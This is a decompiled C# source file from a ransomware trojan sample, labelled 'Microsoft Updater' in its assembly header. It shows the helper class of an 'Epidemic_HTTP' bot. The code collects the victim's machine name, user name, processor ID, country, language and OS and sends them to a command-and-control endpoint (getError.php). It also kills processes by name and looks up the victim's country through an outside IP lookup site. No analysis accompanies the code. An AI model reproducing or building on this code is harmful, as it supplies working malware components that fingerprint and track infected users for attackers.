// Decompiled with JetBrains decompiler
// Type: Epidemic_HTTP.Functions
// Assembly: Microsoft Updater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2E2B3032-0636-4B8C-A49B-30EA659CCFCC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00024-msil\Trojan-Ransom.Win32.Foreign.neod-4b5461e9b7975d274b77e2b28ee9fc7a71cf3294652993dfd23081524d2a783e.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using System.Threading;
using System.Web;

namespace Epidemic_HTTP
{
  internal class Functions
  {
    private static Random random = new Random((int) DateTime.Now.Ticks);

    public static void ReportError(string method, string error_message, string stack_trace)
    {
      Flags flags = new Flags();
      string url = Config.http_dir + "getError.php?compname=" + HttpUtility.UrlEncode(Environment.MachineName) + "&compuser=" + HttpUtility.UrlEncode(Environment.UserName) + "&hwid=" + HttpUtility.UrlEncode(Functions.GetProcessorID()) + "&country=" + HttpUtility.UrlEncode(Functions.getCountryCode()) + "&complang=" + Functions.getComputerLanguage() + "&os=" + HttpUtility.UrlEncode(Functions.GetOperatingSystem()) + "&version=" + HttpUtility.UrlEncode(Config.bot_version.ToString()) + "&method=" + HttpUtility.UrlEncode(method) + "&errmsg=" + HttpUtility.UrlEncode(error_message) + "&stacktrace=" + HttpUtility.UrlEncode(stack_trace.Replace(Environment.NewLine, "<br />"));
      Console.WriteLine(url);
      Functions.GetWebpageContents(url);
    }

    public static bool FindAndKillProcess(string name)
    {
      foreach (Process process in Process.GetProcesses())
      {
        if (process.ProcessName.StartsWith(name))
        {
          process.Kill();
          return true;
        }
      }
      return false;
    }

    public static string GetMethodName(string message)
    {
      try
      {
        return string.Format(message, (object) new StackFrame(1).GetMethod().Name);
      }
      catch
      {
        return (string) null;
      }
    }

    public static string RandomString(int size, bool lowerCase)
    {
      try
      {
        StringBuilder stringBuilder = new StringBuilder();
        for (int index = 0; index < size; ++index)
        {
          char ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * Functions.random.NextDouble() + 65.0)));
          stringBuilder.Append(ch);
        }
        return lowerCase ? stringBuilder.ToString().ToLower() : stringBuilder.ToString();
      }
      catch (Exception ex)
      {
        Functions.ReportError(Functions.GetMethodName("{0}"), ex.Message, ex.StackTrace);
        return (string) null;
      }
    }

    public static string[] GetStringInBetween(
      string strBegin,
      string strEnd,
      string strSource,
      bool includeBegin,
      bool includeEnd)
    {
      try
      {
        string[] stringInBetween = new string[2]{ "", "" };
        int num = strSource.IndexOf(strBegin);
        if (num != -1)
        {
          if (includeBegin)
            num -= strBegin.Length;
          strSource = strSource.Substring(num + strBegin.Length);
          int length = strSource.IndexOf(strEnd);
          if (length != -1)
          {
            if (includeEnd)
              length += strEnd.Length;
            stringInBetween[0] = strSource.Substring(0, length);
            if (length + strEnd.Length < strSource.Length)
              stringInBetween[1] = strSource.Substring(length + strEnd.Length);
          }
        }
        else
          stringInBetween[1] = strSource;
        return stringInBetween;
      }
      catch (Exception ex)
      {
        Functions.ReportError(Functions.GetMethodName("{0}"), ex.Message, ex.StackTrace);
        return (string[]) null;
      }
    }

    public static string GetOperatingSystem()
    {
      try
      {
        OperatingSystem osVersion = Environment.OSVersion;
        string operatingSystem = "Unknown";
        switch (osVersion.Platform)
        {
          case PlatformID.Win32Windows:
            switch (osVersion.Version.Minor)
            {
              case 0:
                operatingSystem = "Windows 95";
                break;
              case 10:
                operatingSystem = "Windows 98";
                break;
              case 90:
                operatingSystem = "Windows ME";
                break;
            }
            break;
          case PlatformID.Win32NT:
            switch (osVersion.Version.Major)
            {
              case 3:
                operatingSystem = "Windws NT 3.51";
                break;
              case 4:
                operatingSystem = "Windows NT 4";
                break;
              case 5:
                if (osVersion.Version.Minor == 0)
                {
                  operatingSystem = "Windows 2000";
                  break;
                }
                if (osVersion.Version.Minor == 1)
                {
                  operatingSystem = "Windows XP";
                  break;
                }
                if (osVersion.Version.Minor == 2)
                {
                  operatingSystem = "Windows Server 2003";
                  break;
                }
                break;
              case 6:
                operatingSystem = "Windows Vista";
                if (osVersion.Version.Minor == 0)
                {
                  operatingSystem = "Windows Vista";
                  break;
                }
                if (osVersion.Version.Minor == 1)
                {
                  operatingSystem = "Windows 7";
                  break;
                }
                break;
            }
            break;
        }
        return operatingSystem;
      }
      catch (Exception ex)
      {
        Functions.ReportError(Functions.GetMethodName("{0}"), ex.Message, ex.StackTrace);
        return (string) null;
      }
    }

    public static string getComputerLanguage()
    {
      try
      {
        return Thread.CurrentThread.CurrentCulture.Name;
      }
      catch (Exception ex)
      {
        Functions.ReportError(Functions.GetMethodName("{0}"), ex.Message, ex.StackTrace);
        return (string) null;
      }
    }

    public static string getCountryCode()
    {
      try
      {
        return Functions.GetStringInBetween("<br><b>My IP Country Code</b>:&nbsp;&nbsp;", "&nbsp;&nbsp;", Functions.GetWebpageContents("http://www.find-ip-address.org/"), false, false)[0];
      }
      catch
      {
        return "UNK";
      }
    }

    public static string GetProcessorID()
    {
      try
      {
        string processorId = "";
        foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor").Get())
          processorId = (string) managementBaseObject["ProcessorId"];
        return processorId;
      }
      catch (Exception ex)
      {
        Functions.ReportError(Functions.GetMethodName("{0}"), ex.Message, ex.StackTrace);
        return (string) null;
      }
    }

    public static string GetWebpageContents(string url)
    {
      try
      {
        return new StreamReader(WebRequest.Create(url).GetResponse().GetResponseStream()).ReadToEnd();
      }
      catch (Exception ex)
      {
        Functions.ReportError(Functions.GetMethodName("{0}"), ex.Message, ex.StackTrace);
        return (string) null;
      }
    }
  }
}
